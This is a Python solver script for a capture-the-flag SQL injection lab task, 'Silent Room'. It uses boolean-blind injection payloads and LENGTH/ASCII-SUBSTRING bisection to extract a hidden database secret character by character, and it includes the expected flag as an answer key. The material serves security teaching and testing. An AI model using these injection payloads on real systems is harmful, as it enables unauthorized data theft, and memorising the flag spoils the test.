#!/usr/bin/env python3
"""solvers/p1_4.py: Task 1.4 "Trick Tower: Silent Room" canonical exploit.

The door route builds its query with raw string concatenation:

    SELECT 1 FROM door WHERE code='{code}'

and returns exactly one of two tokens, "PASS" (a row matched) or "FAIL"
(no row matched, *or* the query errored), never a result, never a raw
DBMS error. That single bit is the whole oracle. Unlike p1_1 (auth
bypass), p1_2 (error-based extractvalue()) or p1_3 (UNION-based), there is
no data channel here at all: the only thing this script ever learns from
the server is a boolean, so the entire flag has to be walked out one
character at a time by asking the database true/false questions about its
own hidden `keeper.secret` value and reading which token comes back.

This is a real, live extraction against the running stack, every
character below is recovered by actually querying the oracle, not
hardcoded. The expected flag is only used for the final assertion.

The one thing this script takes as given is the target's name,
`keeper.secret`. That name is itself discoverable through this very same
PASS/FAIL oracle, by asking about `information_schema` instead of the
flag (this challenge's isolated database holds only `door` and `keeper`);
see phase1/silent-room/DEBRIEF.md, "Discover where the secret lives", for
the exact queries. This script starts from the discovered name so its
output stays focused on the extraction technique rather than on a long,
tedious char-by-char enumeration of the catalog.
"""

from __future__ import annotations

import os
import sys

import requests

BASE = os.environ.get("SEIYAKU_BASE", "http://localhost:8000")
EXPECTED_FLAG = "SEIYAKU{yes_or_no_is_enough}"

# Generous upper bounds so the walk doesn't depend on foreknowledge of the
# exact flag length/charset, just plausible bounds for a SEIYAKU{...} flag.
MAX_LEN = 64
ASCII_LOW = 32   # space
ASCII_HIGH = 126  # '~'


def oracle(code: str) -> bool:
    """Send one injected `code` value, return the PASS/FAIL bit.

    PASS -> True, FAIL -> True's negation. Anything else (network hiccup,
    unexpected body) is treated as a hard failure of the solver itself,
    not folded into the boolean, that would silently corrupt the walk.
    """
    resp = requests.get(f"{BASE}/p1/silent", params={"code": code}, timeout=10)
    resp.raise_for_status()
    body = resp.text
    has_pass = "PASS" in body
    has_fail = "FAIL" in body
    if has_pass == has_fail:
        raise RuntimeError(
            f"ambiguous oracle response (PASS={has_pass}, FAIL={has_fail}) "
            f"for code={code!r}, response no longer looks like a silent "
            f"PASS/FAIL room"
        )
    return has_pass


def confirm_injection_and_silence() -> None:
    """Step 0: confirm the injection point exists and the oracle is silent.

    `' OR 1=1-- -` forces the WHERE clause true regardless of any real
    door code; `' OR 1=2-- -` forces it false. If both come back
    identically-shaped pages differing only by the PASS/FAIL token, the
    boolean-blind oracle is confirmed. A deliberately malformed payload is
    also checked to confirm errors fold into FAIL rather than surfacing as
    a distinguishable third state.
    """
    print("[p1_4] step 0, confirm injection point + silent oracle")

    true_result = oracle("' OR 1=1-- -")
    print(f"  code=' OR 1=1-- -  -> {'PASS' if true_result else 'FAIL'}")
    if not true_result:
        raise RuntimeError("expected PASS for an always-true injected condition")

    false_result = oracle("' OR 1=2-- -")
    print(f"  code=' OR 1=2-- -  -> {'PASS' if false_result else 'FAIL'}")
    if false_result:
        raise RuntimeError("expected FAIL for an always-false injected condition")

    # A deliberately malformed query (unbalanced quote, no comment to
    # neutralize the trailing literal) must read as FAIL too, not as
    # anything visibly different (e.g. leaked error text).
    malformed_result = oracle("' OR 1=1")  # trailing quote makes this invalid SQL
    print(f"  code=' OR 1=1 (malformed) -> {'PASS' if malformed_result else 'FAIL'}")
    if malformed_result:
        raise RuntimeError("malformed query unexpectedly read as PASS")

    print("  ok: oracle is genuinely boolean-blind (true/false/error all silent)")


def discover_length() -> int:
    """Binary-search the exact length of keeper.secret via LENGTH()."""
    lo, hi = 0, MAX_LEN
    while lo < hi:
        mid = (lo + hi + 1) // 2
        payload = f"' OR LENGTH((SELECT secret FROM keeper LIMIT 1))>={mid}-- -"
        if oracle(payload):
            lo = mid
        else:
            hi = mid - 1
    return lo


def discover_char(position: int) -> str:
    """Binary-search the ASCII code of keeper.secret's char at `position`
    (1-indexed, matching SQL SUBSTRING semantics)."""
    lo, hi = ASCII_LOW, ASCII_HIGH
    while lo < hi:
        mid = (lo + hi + 1) // 2
        payload = (
            "' OR ASCII(SUBSTRING((SELECT secret FROM keeper LIMIT 1),"
            f"{position},1))>={mid}-- -"
        )
        if oracle(payload):
            lo = mid
        else:
            hi = mid - 1
    return chr(lo)


def main() -> int:
    print(f"[p1_4] target: {BASE}/p1/silent")

    try:
        confirm_injection_and_silence()
    except Exception as exc:
        print(f"  FAIL: {exc}")
        print("[p1_4] FAIL")
        return 1

    print("[p1_4] step 1, discover secret length via LENGTH() bisection")
    length = discover_length()
    print(f"  ok: LENGTH(keeper.secret) = {length}")
    if not (0 < length <= MAX_LEN):
        print(f"  FAIL: implausible length {length}")
        print("[p1_4] FAIL")
        return 1

    print("[p1_4] step 2, walk the secret char-by-char via SUBSTRING()/ASCII() bisection")
    chars: list[str] = []
    for pos in range(1, length + 1):
        c = discover_char(pos)
        chars.append(c)
        print(f"  position {pos:>2}: {c!r}  (so far: {''.join(chars)!r})")

    recovered = "".join(chars)
    print(f"[p1_4] recovered secret: {recovered}")

    if recovered != EXPECTED_FLAG:
        print(f"  FAIL: recovered value does not match expected flag")
        print(f"  expected: {EXPECTED_FLAG}")
        print(f"  got:      {recovered}")
        print("[p1_4] FAIL")
        return 1

    print(f"  ok: recovered flag matches: {EXPECTED_FLAG}")
    print("[p1_4] PASS")
    return 0


if __name__ == "__main__":
    sys.exit(main())
